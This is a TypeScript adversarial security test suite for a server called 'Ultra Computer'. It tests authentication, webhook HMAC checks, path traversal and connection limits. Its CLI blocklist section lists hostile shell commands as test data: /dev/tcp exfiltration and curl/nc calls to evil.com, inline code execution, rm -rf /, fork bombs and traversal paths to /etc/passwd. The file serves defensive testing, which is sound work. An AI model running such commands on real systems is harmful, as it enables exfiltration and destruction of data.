#!/usr/bin/env npx tsx
/**
 * Adversarial Security Test Suite for Ultra Computer
 * Tests that all security hardening actually holds up under bypass attempts.
 *
 * Run: ULTRA_API_KEY=test-key SLACK_SIGNING_SECRET=test-secret npx tsx tests/adversarial-security.test.ts
 * Or against a server with real keys set.
 *
 * Some tests (Sections 1, 2, 4, 5) require the server running on localhost:5000.
 * Section 3 (CLI blocklist) runs as unit tests with no server needed.
 */
import crypto from "crypto";
import path from "path";

// ─── Config ───────────────────────────────────────────────────────────────────
const BASE = process.env.TEST_BASE_URL ?? "http://localhost:5000";
const API_KEY = process.env.ULTRA_API_KEY ?? "";
const SLACK_SECRET = process.env.SLACK_SIGNING_SECRET ?? "";
const GITHUB_SECRET = process.env.GITHUB_WEBHOOK_SECRET ?? "";
const CLI_ONLY = process.argv.includes("--cli-only");

// ─── Test runner ──────────────────────────────────────────────────────────────
interface Result { name: string; pass: boolean; detail: string; }
const results: Result[] = [];
let passed = 0; let failed = 0; let skipped = 0;

function record(name: string, pass: boolean, detail = "", skip = false) {
  if (skip) {
    skipped++;
    results.push({ name: `[SKIP] ${name}`, pass: true, detail });
    return;
  }
  if (pass) passed++; else failed++;
  results.push({ name, pass, detail });
  console.log(`  ${pass ? "✓" : "✗"} ${name}${detail ? ` — ${detail}` : ""}`);
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
async function apiFetch(path: string, opts: RequestInit = {}) {
  const headers: Record<string, string> = {
    ...(opts.headers as Record<string, string> ?? {}),
  };
  if (API_KEY) headers["Authorization"] = `Bearer ${API_KEY}`;
  return fetch(`${BASE}${path}`, { ...opts, headers });
}

function slackSig(secret: string, timestamp: string, body: string) {
  const base = `v0:${timestamp}:${body}`;
  const hmac = crypto.createHmac("sha256", secret).update(base).digest("hex");
  return `v0=${hmac}`;
}

function githubSig(secret: string, body: string) {
  return "sha256=" + crypto.createHmac("sha256", secret).update(body).digest("hex");
}

// ─── SECTION 1: Authentication ────────────────────────────────────────────────
async function testAuth() {
  console.log("\n[1] Authentication");

  if (!API_KEY) {
    record("Auth tests", true, "skipped — ULTRA_API_KEY not set (passthrough mode)", true);
    return;
  }

  // 1.1 Valid key
  const r1 = await fetch(`${BASE}/api/models`, { headers: { "Authorization": `Bearer ${API_KEY}` } });
  record("Valid API key returns 200", r1.status === 200, `got ${r1.status}`);

  // 1.2 Wrong key
  const r2 = await fetch(`${BASE}/api/models`, { headers: { "Authorization": "Bearer wrong-key-xyz" } });
  record("Invalid key returns 401", r2.status === 401, `got ${r2.status}`);

  // 1.3 No key
  const r3 = await fetch(`${BASE}/api/models`);
  record("No key returns 401", r3.status === 401, `got ${r3.status}`);

  // 1.4 X-API-Key header also works
  const r4 = await fetch(`${BASE}/api/models`, { headers: { "X-API-Key": API_KEY } });
  record("X-API-Key header accepted", r4.status === 200, `got ${r4.status}`);

  // 1.5 Health check exempt
  const r5 = await fetch(`${BASE}/api/health`);
  record("Health check exempt from auth", r5.status === 200, `got ${r5.status}`);

  // 1.6 Timing attack resistance (50 iterations each)
  const measure = async (key: string) => {
    const times: number[] = [];
    for (let i = 0; i < 50; i++) {
      const t = performance.now();
      await fetch(`${BASE}/api/models`, { headers: { "Authorization": `Bearer ${key}` } });
      times.push(performance.now() - t);
    }
    return times.reduce((a, b) => a + b, 0) / times.length;
  };
  const almostRight = API_KEY.slice(0, -1) + (API_KEY.slice(-1) === "X" ? "Y" : "X");
  const totallyWrong = "A".repeat(API_KEY.length);
  const [avgA, avgW] = await Promise.all([measure(almostRight), measure(totallyWrong)]);
  const diff = Math.abs(avgA - avgW);
  record("Timing attack resistance (avg diff < 10ms)", diff < 10, `diff=${diff.toFixed(2)}ms (almost-right=${avgA.toFixed(1)}ms, wrong=${avgW.toFixed(1)}ms)`);
}

// ─── SECTION 2: Slack HMAC ────────────────────────────────────────────────────
async function testSlack() {
  console.log("\n[2] Slack Webhook HMAC");

  // 2.1 No secret set — skip verification tests
  if (!SLACK_SECRET) {
    record("Slack HMAC tests", true, "skipped — SLACK_SIGNING_SECRET not set", true);
    return;
  }

  const ts = Math.floor(Date.now() / 1000).toString();

  // 2.2 Valid JSON body
  const jsonBody = JSON.stringify({ type: "url_verification", challenge: "test-challenge" });
  const r1 = await fetch(`${BASE}/api/messaging/webhook/slack`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Slack-Signature": slackSig(SLACK_SECRET, ts, jsonBody),
      "X-Slack-Request-Timestamp": ts,
    },
    body: jsonBody,
  });
  record("Slack: valid HMAC (JSON) accepted", r1.status === 200, `got ${r1.status}`);

  // 2.3 Valid URL-encoded body (slash command)
  const formBody = "command=%2Fultra&text=hello&user_id=U123";
  const r2 = await fetch(`${BASE}/api/messaging/webhook/slack`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      "X-Slack-Signature": slackSig(SLACK_SECRET, ts, formBody),
      "X-Slack-Request-Timestamp": ts,
    },
    body: formBody,
  });
  record("Slack: valid HMAC (URL-encoded) accepted", r2.status === 200 || r2.status === 400, `got ${r2.status} (400 ok if slash command not routed)`);

  // 2.4 Wrong signature
  const r3 = await fetch(`${BASE}/api/messaging/webhook/slack`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Slack-Signature": "v0=deadbeef00000000",
      "X-Slack-Request-Timestamp": ts,
    },
    body: jsonBody,
  });
  record("Slack: invalid HMAC returns 403", r3.status === 403, `got ${r3.status}`);

  // 2.5 Replay attack (10 min old timestamp)
  const oldTs = (Math.floor(Date.now() / 1000) - 600).toString();
  const r4 = await fetch(`${BASE}/api/messaging/webhook/slack`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Slack-Signature": slackSig(SLACK_SECRET, oldTs, jsonBody),
      "X-Slack-Request-Timestamp": oldTs,
    },
    body: jsonBody,
  });
  record("Slack: replay attack (old timestamp) returns 403", r4.status === 403, `got ${r4.status}`);

  // 2.6 Missing signature
  const r5 = await fetch(`${BASE}/api/messaging/webhook/slack`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-Slack-Request-Timestamp": ts },
    body: jsonBody,
  });
  record("Slack: missing signature returns 403", r5.status === 403, `got ${r5.status}`);
}

// ─── SECTION 3: CLI Blocklist (unit tests — no server needed) ─────────────────
async function testCliBlocklist() {
  console.log("\n[3] CLI Blocklist");

  // Dynamically import validateCommand from cliToolEngine
  let validateCommand: (cmd: string) => { safe: boolean; reason?: string };
  try {
    const mod = await import("../server/cliToolEngine.js");
    validateCommand = mod.validateCommand;
  } catch {
    try {
      // Try without .js extension (ts-node/tsx)
      const mod = await import("../server/cliToolEngine");
      validateCommand = mod.validateCommand;
    } catch (e) {
      record("CLI blocklist tests", false, `Could not import cliToolEngine: ${e}`, false);
      return;
    }
  }

  const attacks: Array<{ cmd: string; desc: string }> = [
    // Network exfiltration
    { cmd: "bash -c 'echo foo > /dev/tcp/evil.com/80'", desc: "/dev/tcp exfil" },
    { cmd: "exec 3<>/dev/tcp/evil.com/443", desc: "exec fd /dev/tcp" },
    { cmd: "/bin/bash -c 'echo > /dev/udp/evil.com/53'", desc: "/dev/udp exfil" },
    { cmd: "socat TCP:evil.com:80 -", desc: "socat relay" },
    { cmd: "curl http://evil.com", desc: "curl" },
    { cmd: "wget http://evil.com", desc: "wget" },
    { cmd: "nc evil.com 80", desc: "nc" },
    // Inline code execution
    { cmd: "node -e \"require('child_process').exec('id')\"", desc: "node -e" },
    { cmd: "node --eval 'process.exit()'", desc: "node --eval" },
    { cmd: "python3 -c 'import os; os.system(\"id\")'", desc: "python -c" },
    { cmd: "perl -e 'system(\"id\")'", desc: "perl -e" },
    { cmd: "ruby -e 'system(\"id\")'", desc: "ruby -e" },
    // Package installs
    { cmd: "pip install evil-package", desc: "pip install" },
    { cmd: "pip3 install evil-package", desc: "pip3 install" },
    { cmd: "npm install evil-package", desc: "npm install" },
    { cmd: "npm i evil-package", desc: "npm i shorthand" },
    // Persistence
    { cmd: "crontab -e", desc: "crontab" },
    // Destructive
    { cmd: "rm -rf /", desc: "rm -rf /" },
    { cmd: "sudo rm file", desc: "sudo" },
    { cmd: "chmod 777 /etc/passwd", desc: "chmod 777" },
    // Fork bombs
    { cmd: ":(){ :|:& };:", desc: "classic fork bomb" },
    { cmd: "bomb(){ bomb|bomb& };bomb", desc: "renamed fork bomb" },
    { cmd: "f ( ) { f | f & } ; f", desc: "spaced fork bomb" },
  ];

  for (const { cmd, desc } of attacks) {
    const result = validateCommand(cmd);
    record(`CLI block: ${desc}`, !result.safe, result.safe ? "ALLOWED (should be blocked)" : (result.reason ?? ""));
  }

  // Safe commands that must pass
  const safe = [
    { cmd: "ls -la", desc: "ls" },
    { cmd: "cat /tmp/file.txt", desc: "cat" },
    { cmd: "echo hello world", desc: "echo" },
    { cmd: "grep -r pattern .", desc: "grep" },
    { cmd: "wc -l file.txt", desc: "wc" },
    { cmd: "sort data.csv", desc: "sort" },
    { cmd: "head -20 file.txt", desc: "head" },
    { cmd: "python3 script.py", desc: "python3 script (no -c)" },
  ];
  for (const { cmd, desc } of safe) {
    const result = validateCommand(cmd);
    record(`CLI allow: ${desc}`, result.safe, result.safe ? "" : `blocked: ${result.reason}`);
  }
}

// ─── SECTION 4: Path Traversal ────────────────────────────────────────────────
async function testPathTraversal() {
  console.log("\n[4] Path Traversal & Symlink");

  const traversalPaths = [
    { path: "../../../etc/passwd", desc: "simple traversal" },
    { path: "..%2F..%2F..%2Fetc%2Fpasswd", desc: "encoded traversal" },
    { path: "subdir/../../etc/passwd", desc: "nested traversal" },
    { path: "....//....//etc/passwd", desc: "double-dot slash" },
  ];

  for (const { path: p, desc } of traversalPaths) {
    const r = await apiFetch(`/api/files/read?path=${p}`);
    record(`Path traversal: ${desc} blocked`, r.status === 400 || r.status === 403 || r.status === 404 || r.status === 401, `got ${r.status}`);
  }
}

// ─── SECTION 5: SSE Connection Flood ─────────────────────────────────────────
async function testSseFlood() {
  console.log("\n[5] SSE Connection Cap");

  const MAX = 5;
  const controllers: AbortController[] = [];

  // Open MAX connections
  const openConn = async () => {
    const ctrl = new AbortController();
    controllers.push(ctrl);
    fetch(`${BASE}/api/notifications`, {
      headers: API_KEY ? { "Authorization": `Bearer ${API_KEY}` } : {},
      signal: ctrl.signal,
    }).catch(() => {});
    return ctrl;
  };

  for (let i = 0; i < MAX; i++) await openConn();

  // Wait for connections to establish
  await new Promise(r => setTimeout(r, 800));

  // 6th connection should be rejected
  let status: number;
  try {
    const r = await fetch(`${BASE}/api/notifications`, {
      headers: API_KEY ? { "Authorization": `Bearer ${API_KEY}` } : {},
      signal: AbortSignal.timeout(3000),
    });
    status = r.status;
  } catch {
    status = 0;
  }
  record("SSE: 6th connection from same IP gets 429", status === 429, `got ${status}`);

  // Cleanup
  for (const ctrl of controllers) try { ctrl.abort(); } catch {}
  await new Promise(r => setTimeout(r, 200));
}

// ─── SECTION 6: GitHub Webhook HMAC ──────────────────────────────────────────
async function testGithub() {
  console.log("\n[6] GitHub Webhook HMAC");

  if (!GITHUB_SECRET) {
    record("GitHub HMAC tests", true, "skipped — GITHUB_WEBHOOK_SECRET not set", true);
    return;
  }

  const body = JSON.stringify({ action: "opened", number: 1 });

  // 6.1 Valid signature
  const r1 = await fetch(`${BASE}/api/messaging/webhook/github`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Hub-Signature-256": githubSig(GITHUB_SECRET, body),
      "X-GitHub-Event": "pull_request",
    },
    body,
  });
  record("GitHub: valid HMAC accepted", r1.status === 200 || r1.status === 202, `got ${r1.status}`);

  // 6.2 Invalid signature
  const r2 = await fetch(`${BASE}/api/messaging/webhook/github`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-Hub-Signature-256": "sha256=deadbeef00000000",
      "X-GitHub-Event": "push",
    },
    body,
  });
  record("GitHub: invalid HMAC returns 403", r2.status === 403, `got ${r2.status}`);

  // 6.3 Missing signature
  const r3 = await fetch(`${BASE}/api/messaging/webhook/github`, {
    method: "POST",
    headers: { "Content-Type": "application/json", "X-GitHub-Event": "push" },
    body,
  });
  record("GitHub: missing signature returns 403", r3.status === 403, `got ${r3.status}`);
}

// ─── Main ─────────────────────────────────────────────────────────────────────
async function main() {
  console.log("═══════════════════════════════════════════════");
  console.log("  Ultra Computer — Adversarial Security Tests  ");
  console.log("═══════════════════════════════════════════════");
  console.log(`  Base URL: ${CLI_ONLY ? "(skipped — CLI only)" : BASE}`);
  console.log(`  Auth key: ${API_KEY ? "set" : "NOT SET (passthrough)"}`);
  console.log(`  Slack secret: ${SLACK_SECRET ? "set" : "NOT SET"}`);
  console.log(`  GitHub secret: ${GITHUB_SECRET ? "set" : "NOT SET"}`);

  if (CLI_ONLY) {
    await testCliBlocklist();
  } else {
    await testAuth();
    await testSlack();
    await testCliBlocklist();
    await testPathTraversal();
    await testSseFlood();
    await testGithub();
  }

  // ─── Summary ───────────────────────────────────────────────────────────────
  console.log("\n═══════════════════════════════════════════════");
  console.log("  Results Summary");
  console.log("═══════════════════════════════════════════════");
  console.log(`  Passed:  ${passed}`);
  console.log(`  Failed:  ${failed}`);
  console.log(`  Skipped: ${skipped}`);

  if (failed > 0) {
    console.log("\n  FAILURES:");
    for (const r of results.filter(r => !r.pass)) {
      console.log(`    ✗ ${r.name} — ${r.detail}`);
    }
    process.exit(1);
  } else {
    console.log("\n  ALL TESTS PASSED ✓");
    process.exit(0);
  }
}

main().catch(err => {
  console.error("Fatal error:", err);
  process.exit(1);
});
